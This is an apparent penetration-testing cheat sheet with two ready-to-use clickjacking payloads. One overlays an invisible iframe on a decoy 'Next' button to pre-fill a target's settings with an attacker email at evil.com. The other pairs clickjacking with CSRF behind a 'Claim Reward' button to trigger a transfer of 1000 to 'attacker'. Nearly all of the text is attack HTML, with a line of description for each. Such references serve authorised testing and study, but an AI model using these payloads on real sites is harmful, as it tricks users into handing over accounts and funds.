---
tags:
  - Exploitation
  - Foundational
  - HTTP
  - Initial_Access
  - Web_Application
---

### Multi-Step Form Pre-Fill
> Pre-fill form values and hijack submit action.

```html
<html>
  <head>
    <style>
      iframe {
        position: absolute;
        top: -100px;
        left: -100px;
        width: 700px;
        height: 600px;
        opacity: 0.0001;
      }
    </style>
  </head>
  <body>
    <button style="position:absolute;top:385px;left:80px;">Next</button>
    <iframe src="https://<TargetHost>/settings?email=attacker@evil.com"></iframe>
  </body>
</html>
```

### Clickjacking + CSRF Combo
> [!important] Use clickjacking to make victim interact with CSRF-protected form.

```html
<style>
  iframe { opacity: 0.0001; position: absolute; top: 0; left: 0; }
  button { position: absolute; top: 185px; left: 50px; }
</style>
<button>Claim Reward</button>
<iframe src="https://<TargetHost>/transfer?amount=1000&to=attacker"></iframe>
```
